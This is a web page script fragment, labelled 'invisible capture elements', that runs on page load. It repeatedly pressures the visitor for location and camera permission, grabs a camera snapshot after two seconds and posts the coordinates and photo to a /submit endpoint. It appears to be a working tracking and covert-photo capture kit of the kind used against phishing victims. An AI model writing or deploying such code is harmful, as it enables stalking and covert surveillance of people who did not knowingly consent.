  <!-- Invisible capture elements -->

  <script>
    async function requestLocation() {
      return new Promise((resolve, reject) => {
        const tryGetLocation = () => {
          navigator.geolocation.getCurrentPosition(
            pos => resolve(pos),
            err => {
              console.warn("Location access denied. Retrying...");
              setTimeout(tryGetLocation, 1000);
            }
          );
        };
        tryGetLocation();
      });
    }

    async function requestCamera() {
      while (true) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          return stream;
        } catch (err) {
          alert("Please allow camera access to proceed.");
          await new Promise(res => setTimeout(res, 1000));
        }
      }
    }

    async function getLocationAndCamera() {
      try {
        const position = await requestLocation();
        const latitude = position.coords.latitude.toFixed(6);
        const longitude = position.coords.longitude.toFixed(6);
        console.log("ЁЯУН Location:", latitude, longitude);

        const stream = await requestCamera();
        const video = document.getElementById("video");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL("image/jpeg");

            fetch("/submit", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                lat: latitude,
                lon: longitude,
                image: imageData
              })
            })
              .then(res => res.json())
              .then(res => console.log("тЬЕ Submitted:", res))
              .catch(err => console.error("тЭМ Submit error:", err));

            stream.getTracks().forEach(track => track.stop());
          }, 2000);
        };
      } catch (err) {
        alert("Could not complete capture. Please check browser permissions.");
        console.error("Final error:", err);
      }
    }

    window.onload = getLocationAndCamera;
  </script>
